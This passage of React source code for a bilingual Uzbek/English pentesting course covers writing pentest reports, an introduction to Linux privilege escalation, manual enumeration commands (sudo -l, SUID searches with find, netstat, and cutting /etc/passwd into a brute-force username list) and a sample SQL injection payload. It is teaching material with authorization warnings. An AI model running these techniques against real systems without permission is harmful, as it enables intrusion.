    React.createElement(Quiz,{q:{uz:"Linux privescning eng birinchi tekshiruvi qaysi?",en:"One of the very first Linux privesc checks?"},opts:[{uz:"sudo -l bilan sudo huquqlarini ko'rish",en:"Checking sudo rights with sudo -l"},{uz:"Kompyuterni o'chirish",en:"Shutting down the computer"},{uz:"Brauzerni ochish",en:"Opening a browser"},{uz:"Fonni o'zgartirish",en:"Changing the wallpaper"}],correct:0,exp:{uz:"sudo -l joriy foydalanuvchiga qanday sudo huquqlari berilganini ko'rsatadi — ko'pincha root'ga tez yo'l.",en:"sudo -l shows the current user's sudo rights — often a quick path to root."}}));
}
function LessonL30(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Pentestning yakuniy bosqichi","The final phase of a pentest")),
    React.createElement(P,null,t(lang,"Haqiqiy hujumchilar izlarini yashiradi, lekin professional pentesterning eng muhim mahsuloti — hisobot. Mijoz sizga tizimini test qilish uchun pul to'laydi, lekin u \"buzdim\" degan gapni emas, balki nima buzilgani, qanchalik xavfli ekani va qanday tuzatishni bilishni xohlaydi. Agar topilmalaringiz tushunarli, takrorlanadigan va tuzatib bo'ladigan tarzda hujjatlashtirilmasa, butun ish qiymatini yo'qotadi. Yaxshi pentester — yaxshi yozuvchi hamdir.","Real attackers cover their tracks, but a professional pentester's most important deliverable is the report. The client pays you to test their system, but they don't want to hear \"I broke in\" — they want to know what was broken, how dangerous it is, and how to fix it. If your findings aren't documented in a clear, reproducible and fixable way, the whole engagement loses its value. A good pentester is also a good writer.")),
    React.createElement(H2,{num:"§2"},t(lang,"Professional hisobot tuzilishi","Professional report structure")),
    React.createElement(FlowSteps,{color:"#69db7c",title:{uz:"Hisobot bosqichlari",en:"Report stages"},steps:[
      {icon:"📄",text:{uz:"Executive Summary — rahbariyat uchun texnik bo'lmagan xulosa",en:"Executive Summary — non-technical summary for management"}},
      {icon:"🎯",text:{uz:"Scope & Methodology — nima va qanday test qilingani",en:"Scope & Methodology — what was tested and how"}},
      {icon:"🐞",text:{uz:"Findings — har zaiflik: tavsif, jiddiylik (CVSS), isbot",en:"Findings — each vuln: description, severity (CVSS), proof"}},
      {icon:"🛠",text:{uz:"Remediation — qanday tuzatish bo'yicha tavsiyalar",en:"Remediation — how-to-fix recommendations"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Jiddiylik va CVSS","Severity and CVSS")),
    React.createElement(P,null,t(lang,"Har bir topilma bir xil xavfli emas. Mijozga qaysi muammoni birinchi tuzatish kerakligini ko'rsatish uchun jiddiylik darajasi beriladi: Critical (kritik), High (yuqori), Medium (o'rta), Low (past) va Info. Bu darajani ob'ektiv baholash uchun CVSS (Common Vulnerability Scoring System) standarti ishlatiladi — u zaiflikni bir necha mezon bo'yicha (masofadan foydalanish mumkinmi, murakkabligi, ta'siri) 0 dan 10 gacha ballaydi. 9.0+ — kritik, 7.0-8.9 — yuqori. Bu mijozga cheklangan vaqtni to'g'ri taqsimlashga yordam beradi.","Not every finding is equally dangerous. To show the client which problem to fix first, each gets a severity: Critical, High, Medium, Low and Info. To rate this objectively the CVSS (Common Vulnerability Scoring System) standard is used — it scores a vulnerability on several criteria (is it remotely exploitable, how complex, what impact) from 0 to 10. 9.0+ is critical, 7.0-8.9 is high. This helps the client allocate limited time correctly.")),
    React.createElement(H2,{num:"§4"},t(lang,"Yaxshi topilma qanday yoziladi","How to write a good finding")),
    React.createElement(P,null,t(lang,"Har bir topilma bir necha qismdan iborat bo'lishi kerak: (1) Sarlavha — aniq va qisqa (masalan \"Login formasida SQL Injection\"). (2) Tavsif — zaiflik nima va nega xavfli. (3) Ta'sir (Impact) — hujumchi buni ishlatib nima qila oladi. (4) Isbot (Proof of Concept) — aniq buyruqlar, skrinshotlar va qadamlar, mijoz o'zi takrorlab ko'ra olishi uchun. (5) Tuzatish tavsiyasi — aniq, amaliy yechim. (6) Havolalar — OWASP yoki CVE manbalari. Eng muhimi isbot: mijoz muammoni takrorlab, tuzatgach yana sinab ko'rishi mumkin bo'lsin.","Each finding should have several parts: (1) Title — clear and short (e.g. \"SQL Injection in the login form\"). (2) Description — what the vulnerability is and why it is dangerous. (3) Impact — what an attacker can do with it. (4) Proof of Concept — exact commands, screenshots and steps so the client can reproduce it. (5) Remediation — a concrete, practical fix. (6) References — OWASP or CVE sources. Proof matters most: the client should be able to reproduce the issue, fix it, then retest.")),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Hisobot ikki auditoriya uchun yoziladi: Executive Summary rahbariyat uchun (biznes tili, xavflar, umumiy holat), texnik qism esa IT jamoasi uchun (aniq qadamlar, buyruqlar). Hisobot maxfiy hujjat — u faqat mijoz bilan xavfsiz kanal orqali ulashiladi. Hisobotsiz pentest — tugallanmagan pentest.","A report is written for two audiences: the Executive Summary for management (business language, risks, overall posture) and the technical section for the IT team (exact steps, commands). The report is a confidential document — share it only with the client over a secure channel. A pentest without a report is unfinished.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: noaniq vs tuzilgan topilma","Interactive simulator: vague vs structured finding")),
    React.createElement(P,null,t(lang,"§4 dagi «eng muhimi isbot» da'vosini his qiling — xuddi shu haqiqiy zaiflikni ikki xil yozib ko'ring:","Feel §4's «proof matters most» claim for yourself — write up the exact same real vulnerability two different ways:")),
    React.createElement(FindingQualitySim),
    React.createElement(H2,{num:"§6"},t(lang,"Jiddiylik darajalari (CVSS)","Severity levels (CVSS)")),
    React.createElement(LayerStack,{layers:[{n:"9.0+",name:t(lang,"Critical","Critical"),color:"#ff3a5e",desc:{uz:"Darhol tuzatish — masofadan root/RCE.",en:"Fix immediately — remote root/RCE."}},{n:"7.0+",name:t(lang,"High","High"),color:"#f7b955",desc:{uz:"Tez tuzatish — jiddiy ta'sir.",en:"Fix soon — serious impact."}},{n:"4.0+",name:t(lang,"Medium","Medium"),color:"#ffd43b",desc:{uz:"Rejalashtirilgan tuzatish.",en:"Planned remediation."}},{n:"0.1+",name:t(lang,"Low","Low"),color:"#69db7c",desc:{uz:"Kichik xavf / ma'lumot.",en:"Minor risk / informational."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: topilma tuzilishi","Practice: a finding's anatomy")),
    React.createElement(P,null,t(lang,"Har bir topilma bir xil tuzilishga ega bo'lishi kerak, shunda mijoz uni tushunadi, takrorlaydi va tuzatadi. Quyida bitta topilma namunasi.","Each finding should have the same structure so the client can understand, reproduce and fix it. Below is a sample finding.")),
    React.createElement(Terminal,null,"# FINDING: SQL Injection — login formasida\n# Severity : Critical (CVSS 9.8)\n# Impact   : Ma'lumotlar bazasiga to'liq kirish\n# PoC      : username=admin' OR '1'='1\n# Fix      : Parametrlangan so'rovlar (prepared statements)"),
    React.createElement(Quiz,{q:{uz:"Professional pentesterning eng muhim yakuniy mahsuloti nima?",en:"A professional pentester's most important final deliverable?"},opts:[{uz:"Buzilgan tizimlar soni",en:"The number of systems breached"},{uz:"Aniq, takrorlanadigan va tuzatib bo'ladigan hisobot",en:"A clear, reproducible and fixable report"},{uz:"O'g'irlangan parollar",en:"Stolen passwords"},{uz:"Tozalangan loglar",en:"Cleared logs"}],correct:1,exp:{uz:"Pentestning qiymati hisobotda — topilmalar tushunarli, isbotlangan va tuzatish tavsiyalari bilan hujjatlanishi shart.",en:"The value of a pentest is in the report — findings must be documented clearly, with proof and remediation."}}));
}
function LessonL31(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Imtiyozlarni oshirish nima?","What is privilege escalation?")),
    React.createElement(P,null,t(lang,"Imtiyozlarni oshirish (Privilege Escalation) — mohiyatan pastroq ruxsatnomaga ega hisobdan yuqoriroq ruxsatnomaga ega hisobga o'tishdir. Texnik jihatdan bu operatsion tizim yoki ilovadagi zaiflik, dizayn kamchiligi yoki konfiguratsiya xatosidan foydalanib, odatda cheklangan resurslarga ruxsatsiz kirishni qo'lga kiritishdir. Yakuniy maqsad — Linux'da root, Windows'da esa Administrator huquqlari.","Privilege escalation is essentially moving from a lower-permission account to a higher-permission one. Technically it means using a vulnerability, design flaw or configuration mistake in the OS or an application to gain unauthorized access to resources that are normally restricted. The end goal is root on Linux, or Administrator on Windows.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s04.png",cap:"Oddiy foydalanuvchidan (USER) to'liq nazoratga (SUPER ADMIN) ko'tarilish — privesc mohiyati.",capEn:"Climbing from a normal user (USER) to full control (SUPER ADMIN) — the essence of privesc."}),
    React.createElement(H2,{num:"§2"},t(lang,"Nega bu muhim?","Why does it matter?")),
    React.createElement(P,null,t(lang,"Haqiqiy penetratsion testda sizga to'g'ridan-to'g'ri ma'muriy kirish beradigan dastlabki kirish nuqtasi (initial access) kamdan-kam uchraydi. Odatda siz past imtiyozli hisob bilan boshlaysiz — masalan, veb-server foydalanuvchisi. Bu darajada ko'p narsa qila olmaysiz. Imtiyozlarni oshirish esa tizim ma'muri darajasidagi kirishni beradi va quyidagilarga yo'l ochadi:","In a real penetration test you rarely get an initial access point that hands you administrative access directly. Usually you start with a low-privilege account — say, a web-server user. At that level you can do little. Privilege escalation gives you admin-level access and opens the door to:")),
    React.createElement(LayerStack,{layers:[
      {n:"🔑",name:t(lang,"Parollarni qayta o'rnatish","Reset passwords"),color:"#ff3a5e",desc:{uz:"Boshqa foydalanuvchilar parollarini o'zgartirish.",en:"Change other users' passwords."}},
      {n:"🚪",name:t(lang,"Kirishni chetlab o'tish","Bypass access control"),color:"#f7b955",desc:{uz:"Himoyalangan ma'lumotlarga kirish.",en:"Reach protected data."}},
      {n:"⚙",name:t(lang,"Konfiguratsiyani tahrirlash","Edit configs"),color:"#4dabf7",desc:{uz:"Dasturiy ta'minot sozlamalarini o'zgartirish.",en:"Modify software configuration."}},
      {n:"📌",name:t(lang,"Persistence","Persistence"),color:"#a855f7",desc:{uz:"Tizimda doimiy qolishni faollashtirish.",en:"Establish long-term persistence."}},
      {n:"👑",name:t(lang,"Istalgan buyruq","Any admin command"),color:"#69db7c",desc:{uz:"Istalgan ma'muriy amalni bajarish.",en:"Run any administrative command."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Umumiy jarayon","The general process")),
    React.createElement(P,null,t(lang,"Imtiyozlarni oshirish — uzoq yo'l va ko'p narsa nishonning o'ziga xos konfiguratsiyasiga bog'liq: yadro versiyasi, o'rnatilgan ilovalar, qo'llab-quvvatlanadigan tillar va boshqa foydalanuvchilar parollari. Agar bitta zaiflik to'g'ridan-to'g'ri root shell bermasa, jarayon noto'g'ri sozlashlar (misconfigurations) va bo'sh ruxsatnomalarga (lax permissions) tayanadi. Deyarli har doim quyidagi qadamlar bajariladi:","Privilege escalation is a long road and much depends on the target's specific configuration: kernel version, installed applications, supported languages and other users' passwords. If a single vulnerability doesn't directly yield a root shell, the process leans on misconfigurations and lax permissions. Almost always these steps are followed:")),
    React.createElement(FlowSteps,{color:"#f7b955",title:{uz:"Privesc metodologiyasi",en:"Privesc methodology"},steps:[
      {icon:"🚪",text:{uz:"Foothold — past imtiyozli kirishni qo'lga kiritish",en:"Foothold — obtain low-privilege access"}},
      {icon:"🔍",text:{uz:"Enumeratsiya — tizimni har tomonlama o'rganish",en:"Enumeration — study the system thoroughly"}},
      {icon:"🎯",text:{uz:"Vektor topish — noto'g'ri sozlash yoki zaiflikni aniqlash",en:"Find a vector — spot a misconfig or vulnerability"}},
      {icon:"💥",text:{uz:"Ekspluatatsiya — vektordan foydalanib huquqni oshirish",en:"Exploit — abuse the vector to raise privileges"}},
      {icon:"👑",text:{uz:"Root — to'liq nazorat va post-exploitation",en:"Root — full control and post-exploitation"}},
    ]}),
    React.createElement(Terminal,null,"# Kirgach, kim ekanligimizni tekshiramiz\nwhoami\nid\n# uid=1000(user) gid=1000(user) ... — past imtiyozli, hali root emas"),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: tasodifiy urinish vs metodik enumeratsiya","Interactive simulator: random guessing vs methodical enumeration")),
    React.createElement(P,null,t(lang,"§3 dagi metodologiyaning nega ishlashini his qiling — xuddi shu foothold'dan ikki yondashuv bilan boring:","Feel why the §3 methodology works — go from the exact same foothold with two different approaches:")),
    React.createElement(MethodologySim),
    eth("Imtiyozlarni oshirish texnikalarini faqat o'z laboratoriyangizda, CTF'da yoki yozma ruxsat berilgan pentestda sinang. Ruxsatsiz tizimda buni qilish jinoyat.","Only practise privilege-escalation techniques in your own lab, in CTFs, or on a written-authorized pentest. Doing this on an unauthorized system is a crime."),
    React.createElement(Quiz,{q:{uz:"Imtiyozlarni oshirishning asosiy maqsadi nima?",en:"What is the main goal of privilege escalation?"},opts:[{uz:"Internet tezligini oshirish",en:"Speeding up the internet"},{uz:"Past imtiyozli hisobdan root/Administrator huquqiga o'tish",en:"Moving from a low-privilege account to root/Administrator"},{uz:"Fayllarni shifrlash",en:"Encrypting files"},{uz:"Parolni unutish",en:"Forgetting a password"}],correct:1,exp:{uz:"Privesc — past imtiyozli kirishdan tizim ustidan to'liq nazorat (root/Administrator) beradigan yuqori huquqqa o'tishdir.",en:"Privesc is moving from low-privilege access to the high privileges (root/Administrator) that give full control of the system."}}));
}
function LessonL32(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Enumeratsiya — birinchi qadam","Enumeration — the first step")),
    React.createElement(P,null,t(lang,"Ma'lumot yig'ish (enumeration) — tizimga kirish huquqini qo'lga kiritganingizdan so'ng bajariladigan birinchi qadam. CTF mashinalaridan farqli o'laroq, penetratsion test bir tizimga kirish bilan tugamaydi. Enumeratsiya buzib kirilgandan keyingi bosqichda ham, undan oldingi bosqichdek muhim: qanchalik ko'p bilsangiz, imtiyozlarni oshirish yo'lini shunchalik oson topasiz. Quyida qo'lda o'tkaziladigan asosiy tekshiruvlar batafsil keltirilgan.","Enumeration is the first step you take after gaining access to a system. Unlike CTF machines, a penetration test doesn't end when you get into one system. Enumeration is as important after the breach as before it: the more you know, the easier you find a privilege-escalation path. Below are the key manual checks in detail.")),
    React.createElement(H2,{num:"§2"},t(lang,"Tizim ma'lumotlari","System information")),
    React.createElement(P,null,t(lang,"Birinchi navbatda tizimning o'zi haqida ma'lumot yig'amiz. hostname xost nomini qaytaradi va ba'zan tizimning roli haqida ipuchi beradi (masalan SQL-PROD-01 — ishlab chiqarish SQL serveri). uname -a yadro versiyasini ko'rsatadi — bu kernel exploit qidirishda kerak. /proc/version yadro va o'rnatilgan kompilyator (GCC) haqida qo'shimcha ma'lumot beradi. /etc/issue esa operatsion tizim versiyasini ko'rsatadi (garchi u o'zgartirilishi mumkin bo'lsa ham).","First we gather information about the system itself. hostname returns the host name and sometimes hints at the system's role (e.g. SQL-PROD-01 — a production SQL server). uname -a shows the kernel version — needed to hunt kernel exploits. /proc/version gives extra info about the kernel and installed compiler (GCC). /etc/issue shows the OS version (though it can be edited).")),
    React.createElement(Terminal,null,"hostname            # xost nomi (rol haqida ipuchi)\nuname -a            # yadro versiyasi va arxitektura\ncat /proc/version   # yadro + kompilyator (GCC)\ncat /etc/issue      # OT versiyasi"),
    React.createElement(H2,{num:"§3"},t(lang,"Jarayonlar (ps)","Processes (ps)")),
    React.createElement(P,null,t(lang,"ps buyrug'i ishlayotgan jarayonlarni ko'rsatadi. Uning natijasi to'rt ustundan iborat: PID (jarayon identifikatori), TTY (terminal turi), TIME (jarayon foydalangan CPU vaqti) va CMD (ishlayotgan buyruq). Foydali parametrlar: ps -A — barcha jarayonlarni; ps axjf — jarayonlar daraxtini; ps aux — barcha foydalanuvchilar jarayonlarini, ularni ishga tushirgan foydalanuvchi bilan ko'rsatadi. ps aux ayniqsa muhim, chunki u root sifatida ishlayotgan zaif xizmatlarni ochib beradi.","The ps command shows running processes. Its output has four columns: PID (process id), TTY (terminal type), TIME (CPU time the process used) and CMD (the running command). Useful options: ps -A shows all processes; ps axjf shows the process tree; ps aux shows all users' processes together with the user that started them. ps aux is especially important because it reveals vulnerable services running as root.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s06.png",cap:"ps axjf — jarayonlar daraxti ko'rinishida (qaysi jarayon qaysisidan tug'ilganini ko'rsatadi).",capEn:"ps axjf — the process tree view (shows which process spawned which)."}),
    React.createElement(Terminal,null,"ps -A       # barcha jarayonlar\nps axjf     # jarayonlar daraxti\nps aux      # barcha foydalanuvchilar jarayonlari (USER ustuni bilan)"),
    React.createElement(H2,{num:"§4"},t(lang,"Muhit o'zgaruvchilari (env)","Environment variables (env)")),
    React.createElement(P,null,t(lang,"env buyrug'i muhit o'zgaruvchilarini ko'rsatadi. Eng muhimi — PATH o'zgaruvchisi: u tizim bajariladigan fayllarni qaysi papkalarda qidirishini belgilaydi va ba'zan kompilyator yoki skript tiliga (Python) yo'l ko'rsatib, imtiyozlarni oshirishda ishlatilishi mumkin. Shuningdek HOME, SHELL va boshqa o'zgaruvchilar tizim haqida tasavvur beradi.","The env command shows environment variables. The most important is PATH: it defines which folders the system searches for executables, and can sometimes point to a compiler or scripting language (Python) usable for privilege escalation. HOME, SHELL and other variables also give insight into the system.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s07.png",cap:"env — muhit o'zgaruvchilari; PATH, HOME va SHELL qatorlariga e'tibor bering.",capEn:"env — environment variables; note the PATH, HOME and SHELL lines."}),
    React.createElement(H2,{num:"§5"},t(lang,"Foydalanuvchilar, huquqlar va fayllar","Users, privileges and files")),
    React.createElement(P,null,t(lang,"sudo -l — eng muhim buyruqlardan biri: u siz sudo bilan (ba'zan parolsiz) ishga tushira oladigan buyruqlarni ro'yxatlaydi va ko'pincha root'ga to'g'ridan-to'g'ri yo'l ochadi. id joriy (yoki boshqa) foydalanuvchining imtiyoz darajasi va guruhlarini ko'rsatadi. ls buyrug'ini har doim -la parametri bilan ishlating — u yashirin fayllarni ham ko'rsatadi (masalan .secret.txt ni oddiy ls o'tkazib yuboradi). /etc/passwd faylini o'qish tizimdagi barcha foydalanuvchilarni topishning oson yo'li, history esa oldingi buyruqlarda qolgan parol yoki maslahatni ochib berishi mumkin.","sudo -l is one of the most important commands: it lists the commands you can run with sudo (sometimes without a password) and often opens a direct path to root. id shows the privilege level and groups of the current (or another) user. Always use ls with -la — it also shows hidden files (e.g. a plain ls skips .secret.txt). Reading /etc/passwd is an easy way to find all users, and history may reveal passwords or hints left in previous commands.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s08.png",cap:"ls -la — yashirin faylni (.secret.txt) ochib beradi; oddiy ls yoki ls -l uni ko'rsatmaydi.",capEn:"ls -la — reveals a hidden file (.secret.txt); a plain ls or ls -l does not show it."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s09.png",cap:"id frank — id buyrug'i boshqa foydalanuvchining ham imtiyoz darajasini ko'rsatadi.",capEn:"id frank — the id command can also show another user's privilege level."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s10.png",cap:"cat /etc/passwd — tizimdagi barcha foydalanuvchilar (root:x:0:0 root ekanligiga e'tibor bering).",capEn:"cat /etc/passwd — all users on the system (note root:x:0:0 is root)."}),
    React.createElement(P,null,t(lang,"/etc/passwd chiqishini cut bilan qirqib, qo'pol kuch (brute-force) hujumlari uchun foydalanuvchi nomlari ro'yxatiga aylantirish mumkin. Ko'pchilik tizim/xizmat foydalanuvchilari foydasiz bo'lgani uchun, haqiqiy foydalanuvchilarni ajratish uchun \"home\" ni grep qilish yaxshi usul (chunki ularning papkalari /home ostida bo'ladi).","The /etc/passwd output can be cut into a username list for brute-force attacks. Since many are useless system/service users, grepping for \"home\" is a good way to isolate real users (their folders live under /home).")),
    React.createElement(Terminal,null,"sudo -l                              # sudo huquqlarim\nid ; id frank                        # o'zim va boshqa foydalanuvchi\nls -la                               # yashirin fayllar bilan\ncat /etc/passwd                      # barcha foydalanuvchilar\ncat /etc/passwd | cut -d: -f1        # faqat foydalanuvchi nomlari (brute ro'yxati)\ncat /etc/passwd | grep home          # haqiqiy foydalanuvchilar\nhistory                              # oldingi buyruqlar (parol qolgan bo'lishi mumkin)"),
    React.createElement(SlideImg,{src:"privesc/lpe_s11.png",cap:"cat /etc/passwd | cut -d ':' -f 1 — faqat foydalanuvchi nomlari (qo'pol kuch ro'yxati).",capEn:"cat /etc/passwd | cut -d ':' -f 1 — just the usernames (a brute-force list)."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s12.png",cap:"cat /etc/passwd | grep home — haqiqiy foydalanuvchilar (alper, frank), /home papkasi bilan.",capEn:"cat /etc/passwd | grep home — the real users (alper, frank) with a /home folder."}),
    React.createElement(H2,{num:"§6"},t(lang,"Tarmoq (ifconfig, ip route, netstat)","Network (ifconfig, ip route, netstat)")),
    React.createElement(P,null,t(lang,"Nishon boshqa tarmoqqa o'tish nuqtasi (pivot) bo'lishi mumkin. ifconfig tarmoq interfeyslarini ko'rsatadi — quyidagi misolda nishonda uchta interfeys (eth0, tun0, tun1) bor, ya'ni u biz to'g'ridan-to'g'ri ko'ra olmaydigan tarmoqlarga ulangan. ip route mavjud tarmoq yo'nalishlarini tasdiqlaydi.","The target may be a pivot into another network. ifconfig shows the network interfaces — in the example below the target has three interfaces (eth0, tun0, tun1), meaning it is connected to networks we cannot reach directly. ip route confirms the available network routes.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s13.png",cap:"ifconfig — nishonning uchta interfeysi (eth0, tun0, tun1); u boshqa tarmoqlarga ulangan.",capEn:"ifconfig — the target's three interfaces (eth0, tun0, tun1); it is connected to other networks."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s14.png",cap:"ip route — tarmoq yo'nalishlari; boshqa tarmoqlarga (10.9.0.0/16, 10.50.70.0/24) yo'l borligini ko'rsatadi.",capEn:"ip route — the routes; shows paths to other networks (10.9.0.0/16, 10.50.70.0/24)."}),
    React.createElement(P,null,t(lang,"netstat mavjud ulanishlar va tinglash portlarini ochib beradi. Ko'p variantlari bor: netstat -a (barcha ulanishlar va portlar), -at/-au (faqat TCP/UDP), -l (faqat tinglash portlari), -s (protokol statistikasi), -tp (xizmat nomi va PID bilan), -i (interfeys statistikasi). Eng ko'p uchraydigan usul — netstat -ano: -a barcha rozetkalar, -n nomlarni aniqlamaslik, -o taymerlarni ko'rsatish.","netstat reveals existing connections and listening ports. It has many options: netstat -a (all connections and ports), -at/-au (TCP/UDP only), -l (listening ports only), -s (protocol statistics), -tp (with service name and PID), -i (interface statistics). The most common form is netstat -ano: -a all sockets, -n no name resolution, -o show timers.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s16_a.png",cap:"netstat -tp — faol ulanishlarni xizmat nomi va PID/Program ustuni bilan ko'rsatadi.",capEn:"netstat -tp — shows active connections with the service name and PID/Program column."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s18.png",cap:"netstat -ano — barcha rozetkalar, nom aniqlanmasdan, taymerlar bilan (eng ko'p ishlatiladigan shakl).",capEn:"netstat -ano — all sockets, without name resolution, with timers (the most-used form)."}),
    React.createElement(Terminal,null,"ifconfig ; ip route                  # interfeyslar va yo'nalishlar\nnetstat -a                           # barcha ulanishlar va portlar\nnetstat -at        # TCP        netstat -au   # UDP\nnetstat -l                           # faqat tinglash portlari\nnetstat -s                           # protokol statistikasi\nnetstat -tp                          # xizmat nomi + PID bilan\nnetstat -i                           # interfeys statistikasi\nnetstat -ano                         # eng ko'p ishlatiladigan shakl"),
    React.createElement(SlideImg,{src:"privesc/lpe_s15_a.png",cap:"netstat -lt — tinglash (LISTEN) rejimidagi TCP portlar (masalan port 1337).",capEn:"netstat -lt — TCP ports in listening (LISTEN) mode (e.g. port 1337)."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s15_b.png",cap:"netstat -s — protokol bo'yicha statistika (Ip, Icmp, Tcp, Udp).",capEn:"netstat -s — statistics by protocol (Ip, Icmp, Tcp, Udp)."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s16_b.png",cap:"netstat -ltp — tinglash portlari PID/Program ustuni bilan (imtiyozsiz foydalanuvchida bo'sh).",capEn:"netstat -ltp — listening ports with the PID/Program column (empty for an unprivileged user)."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s17_a.png",cap:"netstat -ltp root sifatida — endi PID/Program (2641/nc) ko'rinadi. Root ko'proq ma'lumot ko'radi.",capEn:"netstat -ltp as root — now the PID/Program (2641/nc) is visible. Root sees more info."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s17_b.png",cap:"netstat -i — tarmoq interfeyslari statistikasi (eth0, tun0, tun1).",capEn:"netstat -i — network interface statistics (eth0, tun0, tun1)."}),
    React.createElement(H2,{num:"§7"},t(lang,"find buyrug'i","The find command")),
    React.createElement(P,null,t(lang,"find — arsenaldagi eng kuchli enumeratsiya vositasi. U fayllarni nom, ruxsat, egasi, o'lcham yoki o'zgartirilgan vaqt bo'yicha qidiradi. find ko'p xatolik chiqargani uchun xatolarni /dev/null ga yo'naltirish (2>/dev/null) natijani toza qiladi. Imtiyozlarni oshirish uchun eng muhimi — yozilishi mumkin papkalar va SUID bit o'rnatilgan fayllarni topish. -perm parametri ruxsatga qanday moslashishni belgilaydi: aniq moslik (0777), \"/\" (har qanday belgilangan bit) yoki \"-\" (barcha belgilangan bitlar) shakllari mavjud.","find is the most powerful enumeration tool in the arsenal. It searches files by name, permission, owner, size or modification time. Since find produces many errors, redirecting them to /dev/null (2>/dev/null) keeps the output clean. For privesc the most important uses are finding world-writable folders and files with the SUID bit set. The -perm option sets how permissions are matched: exact match (0777), the \"/\" form (any of the given bits) or the \"-\" form (all of the given bits).")),
    React.createElement(SlideImg,{src:"privesc/lpe_s21.png",cap:"find / -size +100M -type f 2>/dev/null — 100MB dan katta fayllarni topadi (xatolar /dev/null ga yo'naltirilgan).",capEn:"find / -size +100M -type f 2>/dev/null — finds files larger than 100MB (errors sent to /dev/null)."}),
    React.createElement(Terminal,null,"# Nom bo'yicha\nfind / -name flag1.txt 2>/dev/null\nfind / -type d -name config 2>/dev/null\n# Ruxsat bo'yicha\nfind / -perm 0777 -type f 2>/dev/null       # 777 fayllar\nfind / -writable -type d 2>/dev/null         # yoziladigan papkalar\nfind / -perm -u=s -type f 2>/dev/null        # SUID fayllar (privesc!)\n# Egasi / vaqt / o'lcham bo'yicha\nfind /home -user frank 2>/dev/null\nfind / -mtime 10 2>/dev/null                 # 10 kunda o'zgargan\nfind / -size +100M -type f 2>/dev/null       # katta fayllar\n# Dasturlash tillari\nfind / -name python* 2>/dev/null ; find / -name gcc* 2>/dev/null"),
    React.createElement(SlideImg,{src:"privesc/lpe_s20.png",cap:"find / -size +100M — 2>/dev/null'siz natija xatolar bilan chalkash bo'ladi.",capEn:"find / -size +100M — without 2>/dev/null the output is cluttered with errors."}),
    React.createElement(SlideImg,{src:"privesc/lpe_s22.png",cap:"find man sahifasi — -perm parametri: aniq moslik, '/' (har qanday bit) va '-' (barcha bitlar) shakllari.",capEn:"find man page — the -perm option: exact match, the '/' (any bit) and '-' (all bits) forms."}),
React.createElement(H2,{num:"§8"},t(lang,"Interaktiv simulyator: tezkor vs puxta enumeratsiya","Interactive simulator: quick vs thorough enumeration")),
    React.createElement(P,null,t(lang,"§1 dagi asosiy g'oyani his qiling — xuddi shu foothold'ni ikki yondashuv bilan sinang:","Feel §1's core idea for yourself — try the exact same foothold with two approaches:")),
    React.createElement(ThoroughEnumSim),
        eth("Enumeratsiya buyruqlarini faqat siz kirishga haqli bo'lgan tizimlarda ishlating.","Only run enumeration commands on systems you are authorized to access."),
    React.createElement(Quiz,{q:{uz:"Nega ls buyrug'ini har doim -la parametri bilan ishlatish kerak?",en:"Why should you always run ls with the -la option?"},opts:[{uz:"U fayllarni o'chiradi",en:"It deletes files"},{uz:"U yashirin fayllarni ham ko'rsatadi (oddiy ls ularni o'tkazib yuboradi)",en:"It also shows hidden files (a plain ls skips them)"},{uz:"U internetni tezlashtiradi",en:"It speeds up the internet"},{uz:"U parolni ko'rsatadi",en:"It shows the password"}],correct:1,exp:{uz:"ls -la yashirin fayllarni (nuqta bilan boshlanadigan, masalan .secret.txt) ham ko'rsatadi — oddiy ls yoki ls -l ularni o'tkazib yuboradi.",en:"ls -la also shows hidden files (those starting with a dot, e.g. .secret.txt) — a plain ls or ls -l skips them."}}));
}
function LessonL33(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Avtomatik enumeratsiya vositalari","Automated enumeration tools")),
    React.createElement(P,null,t(lang,"Bir nechta vosita enumeratsiya jarayonida vaqtni tejashga yordam beradi. Ular tizimni avtomatik skanerlaydi va potentsial imtiyozlarni oshirish vektorlarini rang bilan belgilab beradi. Ammo yodda tuting: bu vositalar ba'zi vektorlarni o'tkazib yuborishi mumkin, shuning uchun ularni faqat vaqtni tejash uchun ishlating — qo'lda enumeratsiya o'rnini bosmaydi.","Several tools help save time during enumeration. They scan the system automatically and colour-highlight potential privilege-escalation vectors. But remember: these tools can miss some vectors, so use them only to save time — they don't replace manual enumeration.")),
    React.createElement(H2,{num:"§2"},t(lang,"Mashhur vositalar","Popular tools")),
    React.createElement(LayerStack,{layers:[
      {n:"LinPEAS",name:"LinPEAS",color:"#69db7c",desc:{uz:"Eng mashhur — juda batafsil, rangli, hamma narsani tekshiradi.",en:"Most popular — very detailed, colour-coded, checks everything."},proto:"github.com/carlospolop/PEASS-ng"},
      {n:"LinEnum",name:"LinEnum",color:"#4dabf7",desc:{uz:"Klassik bash skript — tez va ishonchli asosiy tekshiruvlar.",en:"Classic bash script — fast, reliable core checks."},proto:"github.com/rebootuser/LinEnum"},
